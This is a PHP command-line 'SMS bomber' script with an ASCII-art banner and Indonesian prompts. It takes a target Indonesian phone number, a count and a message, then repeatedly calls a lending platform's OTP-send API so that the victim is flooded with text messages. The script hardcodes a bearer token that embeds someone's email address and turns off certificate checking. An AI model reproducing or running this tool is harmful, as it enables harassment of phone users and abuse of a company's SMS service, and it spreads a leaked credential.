<?php


    echo "
         ▄              ▄    
        ▌▒█           ▄▀▒▌   
        ▌▒▒█        ▄▀▒▒▒▐  
       ▐▄█▒▒▀▀▀▀▄▄▄▀▒▒▒▒▒▐   
     ▄▄▀▒▒▒▒▒▒▒▒▒▒▒█▒▒▄█▒▐   
   ▄▀▒▒▒░░░▒▒▒░░░▒▒▒▀██▀▒▌   
  ▐▒▒▒▄▄▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄▒▌  
  ▌░░▌█▀▒▒▒▒▒▄▀█▄▒▒▒▒▒▒▒█▒▐  
 ▐░░░▒▒▒▒▒▒▒▒▌██▀▒▒░░░▒▒▒▀▄▌ 
 ▌░▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░▒▒▒▒▌ 
▌▒▒▒▄██▄▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▐ 
▐▒▒▐▄█▄█▌▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▒▒▒▌
▐▒▒▐▀▐▀▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▒▐ 
 ▌▒▒▀▄▄▄▄▄▄▀▒▒▒▒▒▒▒░▒░▒░▒▒▒▌ 
 ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░▒▒▄▒▒▐  
  ▀▄▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░▒▄▒▒▒▒▌  
    ▀▄▒▒▒▒▒▒▒▒▒▒▄▄▄▀▒▒▒▒▄▀   
      ▀▄▄▄▄▄▄▀▀▀▒▒▒▒▒▄▄▀     
         ▀▀▀▀▀▀▀▀▀▀▀▀        

  ____                          
 | __ )  ___  _ __ ___    ___ _ __ ___  ___ 
 |  _ \ / _ \| '_ ` _ \  / __| '_ ` _ \/ __|
 | |_) | (_) | | | | | | \__ \ | | | | \__ \
 |____/ \___/|_| |_| |_| |___/_| |_| |_|___/
                  by : amir furqon 
Bom sms tools 
Gunakan dengan bijak ! 
thx to SGB Team.                                                        
\n";
echo "[?]Nomer tujuan: +62";
$no = trim(fgets(STDIN));
echo "[?]Jumlah : ";
$jmlh = trim(fgets(STDIN));
echo "Masukkan Pesan : ";
$pesan = trim(fgets(STDIN));


$headers = array();
    $headers[] = 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2NvdW50X3R5cGUiOiIzYjZiMjIwYi0yMDE5LTQyNzktODM0My1jYmU2MTY3Zjc2MDIiLCJlbWFpbCI6InJhY2hlbHN1Z2VoYWFAZ21haWwuY29tIiwiZXhwIjoxNTkyOTY4MjgwLCJpYXQiOjE1OTI4ODE4ODAsInVuaXEiOiIwZjM0ZWY4OS1mOTM0LTQ0ZWItYTFhMC05ODM4NmFmNTcxZTMiLCJ1c2VyX2lkIjoiMTAxMzM3In0.0fOVwxMU_fwEVx51M4SOJMND9FWGgaU3ExmKD9Th_x0';
    $headers[] = 'deviceplatform: android';
    $headers[] = 'Content-Type: application/json; charset=UTF-8';
    $headers[] = 'Content-Length: 52';
    $headers[] = 'Host: asgard.koinworks.com';
    $headers[] = 'Connection: close';
    $headers[] = 'Accept-Encoding: gzip, deflate';
    $headers[] = 'User-Agent: okhttp/3.14.4';

    //otp
$i = 0;
while($i < $jmlh) {
    $gtop = "{\"email\":\"\",\"phone_no\":\"$no\",\"user_id\":\"\"}";
    $gotp = curl('https://asgard.koinworks.com/v1/notification/otp/send', $gtop, $headers);
    $gots = json_decode($gotp[1]); 
    if($gots == true ){
        echo $pesan."\n";
    }
  $i++;
  }

function curl($url, $fields = null, $headers = null)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        if ($fields !== null) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
        }
        if ($headers !== null) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        }
        $result   = curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return array(
            $result,
            $httpcode
        );
    }
